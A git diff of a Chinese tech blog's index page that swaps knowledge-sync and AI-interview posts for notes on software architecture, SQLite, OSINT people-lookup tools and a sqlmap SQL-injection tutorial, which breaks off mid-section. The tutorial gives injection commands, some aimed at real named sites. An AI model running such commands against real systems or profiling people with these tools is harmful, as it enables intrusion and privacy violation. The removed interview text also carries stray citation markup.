@@ -252,18 +252,18 @@
 
     <div class="post-header index">
         <h1 class="title">
-            <a href="/2026/08/25/shanggu-%E7%9F%A5%E8%AF%86%E5%90%8C%E6%AD%A5%E9%93%BE%E8%B7%AF%E7%9A%84%E6%B5%8B%E8%AF%95%E4%B8%8E%E8%BF%9E%E9%80%9A%E6%80%A7%E9%AA%8C%E8%AF%81%E6%8C%87%E5%8D%97/">
-                知识同步链路的测试与连通性验证指南
+            <a href="/2026/09/13/social-engineering/">
+                社工库工具
             </a>
         </h1>
         <div class="post-info">
             
-                <span class="date">2026-08-25</span>
+                <span class="date">2026-09-13</span>
             
             
             
                 <span class="category">
-                    <a href="/categories/shanggu-distill/">shanggu-distill</a>
+                    <a href="/categories/渗透/">渗透</a>
                 </span>
             
         </div>
@@ -271,70 +271,11 @@
 
     
         <div class="content">
-            <p><em>最近更新: 2026-08-25 (shanggu distill-docs 覆盖)</em></p>
-<h3 id="1-测试验证的重要性"><a href="#1-测试验证的重要性" class="headerlink" title="1. 测试验证的重要性"></a>1. 测试验证的重要性</h3><p>在自动摄取（Auto-Ingest）与跨系统知识同步架构中，链路的稳定性和数据格式的兼容性是保障系统高可用性的前提。任何网络波动、API 变更或认证过期均可能导致知识流失。因此，建立一套标准化的“测试-同步”（Test-Sync）验证流程是知识管理系统维护的核心规范。</p>
-<h3 id="2-Test-Sync-标准测试流程"><a href="#2-Test-Sync-标准测试流程" class="headerlink" title="2. Test-Sync 标准测试流程"></a>2. Test-Sync 标准测试流程</h3><p>连通性测试应当遵循“极简有效、覆盖全路径”的原则，通常包括以下阶段：</p>
-<h4 id="2-1-极简报文探针测试"><a href="#2-1-极简报文探针测试" class="headerlink" title="2.1 极简报文探针测试"></a>2.1 极简报文探针测试</h4><p>探针测试使用最基础的数据载荷（Payload）发起请求，旨在用最小的开销确认系统处于正常可通状态。</p>
+            <p>国外情报专家最常用的OSINT工具</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/guchangan1/All-Defense-Tool?tab=readme-ov-file#%E7%A4%BE%E5%B7%A5%E4%B8%AA%E4%BA%BA%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E7%B1%BB">a</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.topgoer.cn/docs/offensive/offensive-1e1ht41abkse7">b</a></p>
 <ul>
-<li><strong>测试输入</strong>：定义包含最基础数据结构的测试问答对（例如 <code>Q: 测试</code>）。</li>
-<li><strong>预期响应</strong>：系统接收端成功解析并返回匹配的响应结果（例如 <code>A: 这是测试内容</code>）。</li>
-<li><strong>验证指标</strong>：HTTP 200&#x2F;201 返回码、端到端响应延时（RTT &lt; 200ms）、解析器元数据完整性。</li>
-</ul>
-<h4 id="2-2-接口权限与鉴权校验"><a href="#2-2-接口权限与鉴权校验" class="headerlink" title="2.2 接口权限与鉴权校验"></a>2.2 接口权限与鉴权校验</h4><ul>
-<li><strong>Token 有效性检查</strong>：验证 Auto-Ingest 服务在调用写入接口时，Bearer Token 或 API Key 是否具备足够的写入权限。</li>
-<li><strong>作用域校验（Scope Check）</strong>：确认测试节点仅影响测试命名空间或暂存区，不会污染生产环境的主知识库。</li>
-</ul>
-<h4 id="2-3-异常排查与故障恢复-SOP"><a href="#2-3-异常排查与故障恢复-SOP" class="headerlink" title="2.3 异常排查与故障恢复 SOP"></a>2.3 异常排查与故障恢复 SOP</h4><p>当 <code>test-sync</code> 探针失败时，维护人员应按以下顺序进行排查：</p>
-<ol>
-<li><strong>网络层</strong>：检查 Webhook 目标地址的可达性与防火墙规则。</li>
-<li><strong>协议层</strong>：核对 Header 中的 Content-Type 是否为 <code>application/json</code> 或指定的标准格式。</li>
-<li><strong>应用层</strong>：检查接收端日志，确认是否因 Payload 缺失必填字段导致反序列化异常。</li>
-</ol>
-<h3 id="3-自动化回归测试集成"><a href="#3-自动化回归测试集成" class="headerlink" title="3. 自动化回归测试集成"></a>3. 自动化回归测试集成</h3><p>将 <code>test-sync</code> 探针脚本化并集成至 CI&#x2F;CD Pipeline 或定时 HealthCheck 任务中，能够实现系统故障的提前预警。每次知识库系统升级、数据模型变更或第三方 Bot 路由更新后，必须优先通过连通性测试方可开启全量同步服务。</p>
-
-        </div>
-    
-
-</div>
-            
-                
-<div class="post">
-
-    <div class="post-header index">
-        <h1 class="title">
-            <a href="/2026/08/25/shanggu-%E8%87%AA%E5%8A%A8%E5%8C%96%E7%9F%A5%E8%AF%86%E5%90%8C%E6%AD%A5%E4%B8%8E%E6%95%B0%E6%8D%AE%E9%87%87%E9%9B%86%E6%9E%B6%E6%9E%84%E8%A7%84%E8%8C%83/">
-                自动化知识同步与数据采集架构规范
-            </a>
-        </h1>
-        <div class="post-info">
-            
-                <span class="date">2026-08-25</span>
-            
-            
-            
-                <span class="category">
-                    <a href="/categories/shanggu-distill/">shanggu-distill</a>
-                </span>
-            
-        </div>
-    </div>
-
-    
-        <div class="content">
-            <p><em>最近更新: 2026-08-25 (shanggu distill-docs 覆盖)</em></p>
-<h3 id="1-概述与背景"><a href="#1-概述与背景" class="headerlink" title="1. 概述与背景"></a>1. 概述与背景</h3><p>在现代企业与个人知识管理（PKM&#x2F;KM）体系中，分布式沟通工具（如 IM 软件、ChatBot、协作平台）充当着知识产生的第一现场。然而，碎片化的对话内容若缺乏有效的自动采集机制，极易形成信息孤岛。<strong>Chat Auto-Ingest（聊天数据自动摄取）</strong> 机制旨在通过轻量级接口与后台同步服务，实现从聊天上下文到中央知识库的无缝沉淀。</p>
-<h3 id="2-数据采集与同步链路设计"><a href="#2-数据采集与同步链路设计" class="headerlink" title="2. 数据采集与同步链路设计"></a>2. 数据采集与同步链路设计</h3><p>知识的自动摄取链路包含数据监听、数据解析、连通性测试（Test-Sync）以及知识入库四个核心环节：</p>
-<ol>
-<li><strong>事件触发与监听（Triggering &amp; Event Listening）</strong>：<br>通过 Webhook 或长连接监听聊天系统中的指定动作（例如打上特定的 Tag、使用特定的指令或触发特定的 Bot 提问）。</li>
-<li><strong>数据清洗与报文结构化（Payload Parsing）</strong>：<br>原始对话通常包含大量无效噪声（如表情符号、打招呼口语）。同步服务需将其提取为标准的 Q&amp;A（问答对）或 Markdown 片段。</li>
-<li><strong>链路连通性验证（Test-Sync Verification）</strong>：<br>在正式执行高频同步前，系统需支持测试级别的微型数据包同步（如 <code>test-sync</code> 节点）。通过极简的问答测试（如 <code>Q: 测试 -&gt; A: 这是测试内容</code>），验证鉴权 Token、数据通道传输效率及解析器的可读取性。</li>
-<li><strong>长效入库与状态标记（Ingestion &amp; Status Tracking）</strong>：<br>清洗完毕的知识将被推送到暂存区（Staging Area），并赋予同步状态标记（如 <code>synced</code>, <code>pending</code>, <code>failed</code>），便于后续的自动聚类与重构。</li>
-</ol>
-<h3 id="3-同步机制的演进方向"><a href="#3-同步机制的演进方向" class="headerlink" title="3. 同步机制的演进方向"></a>3. 同步机制的演进方向</h3><p>自动化同步并非单纯的数据搬运，而是知识生命周期管理（TLM）的起点。未来的采集架构应重点关注：</p>
-<ul>
-<li><strong>实时性与批处理的平衡</strong>：小微量数据实时同步以确保即时反馈，大文本与历史存档采用定时批处理（Batch Processing）。</li>
-<li><strong>幂等性与去重控制</strong>：避免同一对话记录被多次触发导致知识库膨胀与版本混淆。</li>
-<li><strong>全链路追踪（Traceability）</strong>：每一条沉淀的知识文档都应保留原始对话的时间戳、参与者与上下文链接，确保知识可追溯、可验证。</li>
+<li><em><strong>Sherlock</strong></em> 是社交媒体账户追踪（爬虫）工具，可用于收集有关人员的信息，对记者和安全研究人员特别有用</li>
 </ul>
 
         </div>
@@ -347,18 +288,18 @@
 
     <div class="post-header index">
         <h1 class="title">
-            <a href="/2026/08/25/shanggu-%E9%9D%9E%E7%BB%93%E6%9E%84%E5%8C%96%E7%9F%A5%E8%AF%86%E7%9A%84%E8%81%9A%E7%B1%BB%E6%8F%90%E7%82%BC%E4%B8%8E%E6%96%87%E6%A1%A3%E5%8C%96%E9%87%8D%E6%9E%84/">
-                非结构化知识的聚类提炼与文档化重构
+            <a href="/2026/09/13/software-structure/">
+                软件架构演变
             </a>
         </h1>
         <div class="post-info">
             
-                <span class="date">2026-08-25</span>
+                <span class="date">2026-09-13</span>
             
             
             
                 <span class="category">
-                    <a href="/categories/shanggu-distill/">shanggu-distill</a>
+                    <a href="/categories/架构/">架构</a>
                 </span>
             
         </div>
@@ -366,31 +307,70 @@
 
     
         <div class="content">
-            <p><em>最近更新: 2026-08-25 (shanggu distill-docs 覆盖)</em></p>
-<h3 id="1-非结构化碎片知识的挑战"><a href="#1-非结构化碎片知识的挑战" class="headerlink" title="1. 非结构化碎片知识的挑战"></a>1. 非结构化碎片知识的挑战</h3><p>通过聊天工具、便签或自动摄取渠道沉淀的原始知识，普遍存在以下痛点：</p>
+            <h2 id="前端了解"><a href="#前端了解" class="headerlink" title="前端了解"></a>前端了解</h2><p>浏览器基本内核：</p>
 <ul>
-<li><strong>碎片化严重</strong>：大量知识以单一问答（Q&amp;A）、孤立句子或测试性记录（如 <code>test-sync</code> 条目）形式分散呈现。</li>
-<li><strong>缺乏上下文</strong>：缺少背景描述、应用场景与前后逻辑关联，导致二次阅读成本极高。</li>
-<li><strong>信息密度不均</strong>：部分内容仅包含简单的测试占位符，而部分内容包含核心技术细节，缺乏统一的质量标准。</li>
+<li>IE(7,8,9,10 这几个版本难以兼容) -&gt; Trident内核 （目前淘汰）</li>
+<li>Chrome: Webkit内核 -&gt; Blink内核</li>
+<li>火狐: Gecko内核</li>
+<li>Safari: Webkit内核</li>
+<li>Opera: Presto -&gt; Webkit内核 -&gt; Blink内核</li>
 </ul>
-<h3 id="2-知识聚类与提炼方法论"><a href="#2-知识聚类与提炼方法论" class="headerlink" title="2. 知识聚类与提炼方法论"></a>2. 知识聚类与提炼方法论</h3><p>为了将零散的“知识碎片”转化为具有高可读性与复用价值的“结构化文档”，需要采用<strong>自下而上的主题聚类与自上而下的文档重构</strong>结合的方法。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">[原始碎片数据 (Auto-Ingest / Chat Raw)]</span><br><span class="line">                 │</span><br><span class="line">                 ▼</span><br><span class="line">[主题提取与关联判定 (Clustering &amp; Taxonomy)]</span><br><span class="line">                 │</span><br><span class="line">                 ▼</span><br><span class="line">[内容综合融合与扩展 (Synthesis &amp; Refinement)]</span><br><span class="line">                 │</span><br><span class="line">                 ▼</span><br><span class="line">[高质量结构化文档 (Structured Markdown Knowledge)]</span><br></pre></td></tr></table></figure>
-
-<h4 id="2-1-主题识别与聚类（Clustering）"><a href="#2-1-主题识别与聚类（Clustering）" class="headerlink" title="2.1 主题识别与聚类（Clustering）"></a>2.1 主题识别与聚类（Clustering）</h4><ol>
-<li><strong>语义相似度分析</strong>：评估不同条目在技术栈、业务域或操作流程上的相关性。</li>
-<li><strong>抽象归纳</strong>：将零散的测试记事、同步日志、技术问答归并到“架构规范”、“测试验证”、“运维指南”等高层级主题下。</li>
-</ol>
-<h4 id="2-2-内容综合与融合（Synthesis）"><a href="#2-2-内容综合与融合（Synthesis）" class="headerlink" title="2.2 内容综合与融合（Synthesis）"></a>2.2 内容综合与融合（Synthesis）</h4><ul>
-<li><strong>废弃无意义占位符</strong>：删除仅用于链路校验的临时数据，提取其背后的机制逻辑。</li>
-<li><strong>上下文补全</strong>：为孤立的问答补充背景背景、操作步骤、注意事项与最佳实践。</li>
-<li><strong>逻辑重构</strong>：按照“概述 -&gt; 核心原理 -&gt; 操作指南 -&gt; 总结”的标准化文档范式重新组织段落，避免简单地堆砌原始问答。</li>
-</ul>
-<h3 id="3-高质量知识文档的标准"><a href="#3-高质量知识文档的标准" class="headerlink" title="3. 高质量知识文档的标准"></a>3. 高质量知识文档的标准</h3><p>重构后的知识文档应满足以下维度规范：</p>
+<h2 id="单体架构"><a href="#单体架构" class="headerlink" title="单体架构"></a>单体架构</h2><p>在单体架构的体系内，对象关系映射（ORM）框架是一个至关重要的组件，其主要功能在于抽象化和简化数据库的增删改查（CRUD）操作。ORM通过封装底层数据库操作的复杂性，显著提升了数据访问层的开发效率。ORM框架的核心功能在于将关系型数据库中的数据模型转换为应用程序中的对象模型，实现了数据访问的抽象化。此种映射机制有效地减少了开发者在进行数据库交互时所需编写的代码量，从而使得开发人员能够将更多的精力投入到业务逻辑的实现上，而非数据访问的具体技术细节。</p>
+<p><img src="/images/single-software-structure.png"></p>
+<p><em><strong>优点:</strong></em></p>
 <ul>
-<li><strong>完整性（Completeness）</strong>：能够独立阐述一个完整的主题或解决方案，不依赖碎片化的上下文提示。</li>
-<li><strong>规范性（Standardization）</strong>：统一采用清晰的 Markdown 层级标题、代码块与结构化列表。</li>
-<li><strong>高可读性（Readability）</strong>：语言表达流畅专业，去除了口语化和冗余字词，适合团队长期归档与查阅。</li>
+<li>开发的便捷性、部署的简洁性以及相对易于管理的横向扩展能力</li>
+<li>开发人员能够在一个统一的代码库中进行快速的迭代和调试，从而加速了开发进程</li>
 </ul>
+<p><em><strong>缺点:</strong></em></p>
+<ul>
+<li>系统的任何微小改动都可能触发对整个应用程序的重新部署，这不仅加剧了维护工作的复杂性，也提高了系统潜在的错误风险</li>
+<li>单体架构在处理大规模用户或数据时，其横向扩展能力受到限制，性能瓶颈成为一个显著问题</li>
+</ul>
+<p><em><strong>基本框架：</strong></em></p>
+<ul>
+<li>前端 - angular jq 模版引擎ecshop(smart)</li>
+<li>后台 - Java(spring mvc, Struts2) PHP(Yii2 zendFramework2, thinkphp3.2)</li>
+</ul>
+<h2 id="多层架构"><a href="#多层架构" class="headerlink" title="多层架构"></a>多层架构</h2><p>应用程序被细分为多个层次，主要包括表现层（用户界面）、业务逻辑层和数据访问层，这一模式通常被称作模型-视图-控制器（MVC）。这种分层的设计方法允许每一层独立进行开发和测试，从而显著提升了代码的可管理性和可维护性。</p>
+<p>多层架构的设计理念体现了专业领域分工的细化，即所谓的垂直领域专业化。它是社会分工精细化趋势在软件开发领域的体现。在这种架构中，前后端的分离正是一种垂直拆分的实践，而MVC本身也是垂直架构的一个典型示例。</p>
+<p><img src="/images/mult-software-structure.png"></p>
+<p><em><strong>优点:</strong></em></p>
+<ul>
+<li>尽管层与层之间的耦合较单体架构有所减少<br><em><strong>缺点:</strong></em></li>
+<li>某一层的变更仍有可能引发连锁反应，影响到其他层的稳定性和功能。</li>
+</ul>
+<p>一般会采用敏捷开发杜绝此类现象，产品周期性迭代<br>逐渐有了devops的概念</p>
+<h3 id="读写分离的数据库架构"><a href="#读写分离的数据库架构" class="headerlink" title="读写分离的数据库架构"></a>读写分离的数据库架构</h3><p><img src="/images/rw-software-structure.png"></p>
+<p><em><strong>原因：</strong></em><br>公司又增加了很多新的业务，系统也增加了更多的功能。预定蔬菜的商户也可以通过手机查看历史订单和各种统计信息了，即使怎么增加应用服务器，也会出现用户需要等待很长的时间，最终数据库也出现了瓶颈。</p>
+<p><em><strong>解决方案：读写分离</strong></em><br>数据库是分布式架构中最难的问题，因为不像应用服务器是不保存数据的。如果想要增加数据库服务器的数量，那么首先需要解决数据重复和一致性的问题。现实中对应的方案有很多，例如读写分离、数据库物理分区、逻辑分表、逻辑分库，但本质上讲只是拆分数据库操作的方式不同而已，而我们应对数据库性能最常用和性价比最高的方式是读写分离</p>
+<p>有了锁的概念 读写锁 乐观锁 悲观锁 </p>
+<h3 id="用消息队列的架构"><a href="#用消息队列的架构" class="headerlink" title="用消息队列的架构"></a>用消息队列的架构</h3><p><img src="/images/rw-cache-software-structure.png"></p>
+<p><em><strong>原因：</strong></em><br>相应的系统中往往存在这种类似的场景，当我们视频网站上传了一条视频后，视频网站往往会进行转码以便适合网络播放，这种操作需要耗费大量的服务器资源，不可能实时的在用户点击提交后处理完毕，否则用户需要等待很久，甚至连接超时。</p>
+<p><em><strong>解决方案：消息队列</strong></em><br>我们可以让此类任务不必是实时完成的。当用户提交请求后，系统会把任务添加到消息队列中，完成之后改变数据的状态，用户在刷新或接到通知后知道任务已经处理完毕。<br>随着业务的发展，公司开始向新的领域扩张，开发了拓展更多商户的代理平台和物流平台，甚至需要和和第三方平台对接，而且需要保证这些平台中一些通用的数据和逻辑是一致的。</p>
+<h3 id="过度阶段-面向服务的架构SOA"><a href="#过度阶段-面向服务的架构SOA" class="headerlink" title="过度阶段 面向服务的架构SOA"></a>过度阶段 面向服务的架构SOA</h3><p><em><strong>原因：</strong></em><br>软件系统变得越来越复杂，参与的开发者就越多，应用系统的分离和分化就变得很有意义了。面向前端的API应用服务器不再真正的处理业务逻辑而是调用专门的服务器来完成。</p>
+<p>单点登录（SSO）是一个典型的面向服务的架构，在互联网公司中被广泛使用。国内互联网巨头往往拥有多个系统，例如腾讯的QQ音乐、空间都可以使用同一个QQ号登陆。于是用户服务和认证服务被剥离开来，各个系统之间通过统一登录和管理用户信息，用户的体验得到了极大的提升，这就是面向服务架构的一个例子。</p>
+<p><img src="/images/SSO-software-structure.png"></p>
+<p>这些大厂不仅在自己的系统内完成了统一的认证和用户管理，并且把登录、授权的服务开放给第三方系统。例如很多网站支持微信登录，这样用户就可以使用一套用户名密码登录大量接入的系统。并且业界有一个通用规范，便于各种系接入，这就是OAuth标准。</p>
+<p><img src="/images/OAuth-software-structure.png"></p>
+<p>通过面向服务的架构改造，系统中分化出了用户服务、物流服务、订单服务等服务，通过OAuth的方式提供了收银机系统认证对接。一些收银机厂商也对接了这个系统，商户可以通过支持的收银设备进行下食材的预定操作了。</p>
+<h2 id="微服务架构"><a href="#微服务架构" class="headerlink" title="微服务架构"></a>微服务架构</h2><p>微服务架构（Microservices Architecture）的兴起源于对传统应用架构的局限性的突破。随着信息技术和互联网的快速发展，企业对于应用的扩展性、可靠性和维护性提出了更高的要求。传统应用架构由于其整体性和复杂性，逐渐难以满足这些需求。在这样的背景下，微服务架构应运而生，以其独特的优势，逐渐成为分布式系统设计的主流架构之一。</p>
+<p>微服务架构是一种分布式系统架构，其核心思想是将一个复杂的应用分解为一组相互协作的微小服务。每个微服务都是独立的业务单元，运行在自己的进程中，并通过轻量级的通信机制（如HTTP RESTful API）相互协作。这些服务围绕业务功能构建，每个服务都有自己的业务逻辑和数据存储，可以独立部署和扩展。</p>
+<p><img src="/images/micro-software-structure.png"></p>
+<p>不同应用和数据之间互相依赖，逻辑纠缠不清，项目的部署进入了混沌状态，对于大型、依赖关系复杂的系统需要一个更为有力的架构。为了解决系统复杂性和服务解耦的问题，这时候该微服务和领域驱动建模（DDD）出场了。</p>
+<p>将不同职责的服务独立部署，从而实现服务内部高内聚，服务之间低耦合的效果，让开发变得更为灵活。当然“分开是为了更好的在一起”，为了重新组合和稳定运行这些服务，人们发明了服务发现、熔断机制、服务部署监控等一篮子工具。</p>
+<p>优点:</p>
+<ul>
+<li>它通过模块化提高了系统的可维护性和可扩展性。每个微服务都是独立的模块，可以单独开发和部署，不会影响到其他服务。</li>
+<li>微服务架构通过服务之间的松耦合，提高了系统的可靠性</li>
+<li>每个服务都有自己的数据存储，避免了单点故障的风险。此外，微服务架构支持技术多样性，每个服务都可以选择最适合其业务需求的技术栈，从而充分发挥各种技术的优势。</li>
+</ul>
+<p>缺点: </p>
+<ul>
+<li>相较于传统应用架构，微服务架构更为复杂，需要更多的管理和协调工作。管理难度大</li>
+<li>微服务架构需要更多的工作量来设计、开发、测试、部署和管理多个小型服务，这增加了开发团队的负担 成本高</li>
+</ul>
+<h2 id="边缘计算架构"><a href="#边缘计算架构" class="headerlink" title="边缘计算架构"></a>边缘计算架构</h2><p><a target="_blank" rel="noopener" href="https://juejin.cn/post/7368505674224238607">引用</a><br><a target="_blank" rel="noopener" href="https://shaogefenhao.com/posts/architecture/roamap-of-system.html#%E9%9D%A2%E5%90%91%E6%9C%8D%E5%8A%A1%E7%9A%84%E6%9E%B6%E6%9E%84-soa">引用</a></p>
 
         </div>
     
@@ -402,18 +382,18 @@
 
     <div class="post-header index">
         <h1 class="title">
-            <a href="/2026/03/26/AI-eye/">
-                AI 视觉
+            <a href="/2026/09/13/springboot/">
+                Springboot
             </a>
         </h1>
         <div class="post-info">
             
-                <span class="date">2026-03-26</span>
+                <span class="date">2026-09-13</span>
             
             
             
                 <span class="category">
-                    <a href="/categories/新/">新</a>
+                    <a href="/categories/后端/">后端</a>
                 </span>
             
         </div>
@@ -421,10 +401,38 @@
 
     
         <div class="content">
-            <p>图片识别</p>
-<p>灰度 通过酱色 识别<br>高斯模糊<br>高通图</p>
-<p>运用到的模型<br>yolo 快速识别<br>Florence-2-base。识图</p>
-<p>LaMA 修图 调参数</p>
+            <p>文章</p>
+<h2 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h2><h2 id="微服务-dubbo-zookeeper"><a href="#微服务-dubbo-zookeeper" class="headerlink" title="微服务 dubbo - zookeeper"></a>微服务 dubbo - zookeeper</h2><h2 id="样式"><a href="#样式" class="headerlink" title="样式"></a>样式</h2><h3 id="undertow-对比-tomcat"><a href="#undertow-对比-tomcat" class="headerlink" title="undertow 对比 tomcat"></a>undertow 对比 tomcat</h3>
+        </div>
+    
+
+</div>
+            
+                
+<div class="post">
+
+    <div class="post-header index">
+        <h1 class="title">
+            <a href="/2026/09/13/sqlite/">
+                SQLite
+            </a>
+        </h1>
+        <div class="post-info">
+            
+                <span class="date">2026-09-13</span>
+            
+            
+            
+                <span class="category">
+                    <a href="/categories/数据库/">数据库</a>
+                </span>
+            
+        </div>
+    </div>
+
+    
+        <div class="content">
+            <h1 id="基础"><a href="#基础" class="headerlink" title="基础"></a>基础</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 进数据库</span></span><br><span class="line">sqlite3 /Users/mac/tabby.db</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看有哪些表</span></span><br><span class="line">.tables</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看 user 表内容</span></span><br><span class="line">SELECT * FROM user;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 退出</span></span><br><span class="line">.quit</span><br></pre></td></tr></table></figure>
 
         </div>
     
@@ -436,18 +444,18 @@
 
     <div class="post-header index">
         <h1 class="title">
-            <a href="/2026/03/26/AI-interview/">
-                AI 面试
+            <a href="/2026/09/13/sqlmap/">
+                SQLMap
             </a>
         </h1>
         <div class="post-info">
             
-                <span class="date">2026-03-26</span>
+                <span class="date">2026-09-13</span>
             
             
             
                 <span class="category">
-                    <a href="/categories/新/">新</a>
+                    <a href="/categories/渗透工具/">渗透工具</a>
                 </span>
             
         </div>
@@ -455,71 +463,654 @@
 
     
         <div class="content">
-            <h2 id="一、-Agent-编排与多-Agent-协作"><a href="#一、-Agent-编排与多-Agent-协作" class="headerlink" title="一、 Agent 编排与多 Agent 协作"></a>一、 Agent 编排与多 Agent 协作</h2><p><strong>1. 题目：在构建企业级 Agent 时，如何保证工具调用（Tool Calling）的可靠性，特别是涉及 CRM、工单等内部系统写操作时？</strong></p>
-<ul>
-<li><strong>参考答案要点：</strong><ul>
-<li>[cite_start]<strong>规范封装：</strong> 对内部系统封装为 Tool 时，需统一 Schema 规范，并集成鉴权、参数校验、幂等与重试机制 [cite: 10, 26]。</li>
-<li>[cite_start]<strong>链路闭环：</strong> 结合“计划-执行-校验”链路，在高风险操作前引入模拟执行（dry-run）或人工审批节点，降低生产事故风险 [cite: 10, 27]。</li>
-<li>[cite_start]<strong>安全审计：</strong> 必须具备 RBAC 权限模型、审计日志与敏感字段（PII）脱敏处理，确保 Agent 在授权范围内操作 [cite: 4, 8, 23]。</li>
+            <p>文章</p>
+<h2 id="网络安全"><a href="#网络安全" class="headerlink" title="网络安全"></a>网络安全</h2><h3 id="分类文章"><a href="#分类文章" class="headerlink" title="分类文章"></a>分类文章</h3><h3 style="margin:15px 0px;padding:2px 0px 2px 10px;color:#262626;overflow:hidden;border-left:4px solid #169FE6;font-family:&quot;white-space:normal;background-color:#FAFAFA;">
+	http://www.vuln.cn/1992<br />
+</h3>
+<h3 style="margin:15px 0px;padding:2px 0px 2px 10px;color:#262626;overflow:hidden;border-left:4px solid #169FE6;font-family:&quot;white-space:normal;background-color:#FAFAFA;">
+	sqlmap简介
+</h3>
+<p style="margin-top:0px;margin-bottom:0px;padding:0px;text-indent:2em;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
+	sqlmap支持五种不同的注入模式：
+</p>
+<ul style="margin:10px 20px;padding:0px;list-style:none;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		1、基于布尔的盲注，即可以根据返回页面判断条件真假的注入。
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		2、基于时间的盲注，即不能根据页面返回内容判断任何信息，用条件语句查看时间延迟语句是否执行（即页面返回时间是否增加）来判断。
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		3、基于报错注入，即页面会返回错误信息，或者把注入的语句的结果直接返回在页面中。
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		4、联合查询注入，可以使用union的情况下的注入。
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		5、堆查询注入，可以同时执行多条语句的执行时的注入。
+	</li>
 </ul>
-</li>
+<h3 style="margin:15px 0px;padding:2px 0px 2px 10px;color:#262626;overflow:hidden;border-left:4px solid #169FE6;font-family:&quot;white-space:normal;background-color:#FAFAFA;">
+	sqlmap支持的数据库有
+</h3>
+<p style="margin-top:0px;margin-bottom:0px;padding:0px;text-indent:2em;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
+	MySQL, Oracle, PostgreSQL, Microsoft SQL Server, Microsoft Access, IBM DB2, SQLite, Firebird, Sybase和SAP MaxDB
+</p>
+<h2 style="margin:15px 0px;padding:2px 0px 2px 10px;color:#262626;overflow:hidden;border-left:4px solid #169FE6;font-family:&quot;white-space:normal;background-color:#FAFAFA;">
+	检测注入
+</h2>
+<h3 style="margin:15px 0px;padding:2px 0px 2px 10px;color:#262626;overflow:hidden;border-left:4px solid #169FE6;font-family:&quot;white-space:normal;background-color:#FAFAFA;">
+	基本格式
+</h3>
+<p style="margin-top:0px;margin-bottom:0px;padding:0px;text-indent:2em;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
+	sqlmap -u "http://www.vuln.cn/post.php?id=1"
+</p>
+<p style="margin-top:0px;margin-bottom:0px;padding:0px;text-indent:2em;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
+	默认使用level1检测全部数据库类型
+</p>
+<p style="margin-top:0px;margin-bottom:0px;padding:0px;text-indent:2em;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
+	sqlmap -u "http://www.vuln.cn/post.php?id=1" &nbsp;--dbms mysql --level 3
+</p>
+<p style="margin-top:0px;margin-bottom:0px;padding:0px;text-indent:2em;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
+	指定数据库类型为mysql，级别为3（共5级，级别越高，检测越全面）
+</p>
+<h3 style="margin:15px 0px;padding:2px 0px 2px 10px;color:#262626;overflow:hidden;border-left:4px solid #169FE6;font-family:&quot;white-space:normal;background-color:#FAFAFA;">
+	跟随302跳转
+</h3>
+<p style="margin-top:0px;margin-bottom:0px;padding:0px;text-indent:2em;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
+	当注入页面错误的时候，自动跳转到另一个页面的时候需要跟随302，<br />
+当注入错误的时候，先报错再跳转的时候，不需要跟随302。<br />
+目的就是：要追踪到错误信息。
+</p>
+<h3 style="margin:15px 0px;padding:2px 0px 2px 10px;color:#262626;overflow:hidden;border-left:4px solid #169FE6;font-family:&quot;white-space:normal;background-color:#FAFAFA;">
+	cookie注入
+</h3>
+<p style="margin-top:0px;margin-bottom:0px;padding:0px;text-indent:2em;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
+	当程序有防get注入的时候，可以使用cookie注入<br />
+sqlmap -u "http://www.baidu.com/shownews.asp" --cookie "id=11" --level 2（只有level达到2才会检测cookie）
+</p>
+<h3 style="margin:15px 0px;padding:2px 0px 2px 10px;color:#262626;overflow:hidden;border-left:4px solid #169FE6;font-family:&quot;white-space:normal;background-color:#FAFAFA;">
+	从post数据包中注入
+</h3>
+<p style="margin-top:0px;margin-bottom:0px;padding:0px;text-indent:2em;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
+	可以使用burpsuite或者temperdata等工具来抓取post包
+</p>
+<p style="margin-top:0px;margin-bottom:0px;padding:0px;text-indent:2em;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
+	sqlmap -r "c:\tools\request.txt" -p "username" --dbms mysql &nbsp; &nbsp;指定username参数
+</p>
+<h2 style="margin:15px 0px;padding:2px 0px 2px 10px;color:#262626;overflow:hidden;border-left:4px solid #169FE6;font-family:&quot;white-space:normal;background-color:#FAFAFA;">
+	注入成功后
+</h2>
+<h3 style="margin:15px 0px;padding:2px 0px 2px 10px;color:#262626;overflow:hidden;border-left:4px solid #169FE6;font-family:&quot;white-space:normal;background-color:#FAFAFA;">
+	获取数据库基本信息
+</h3>
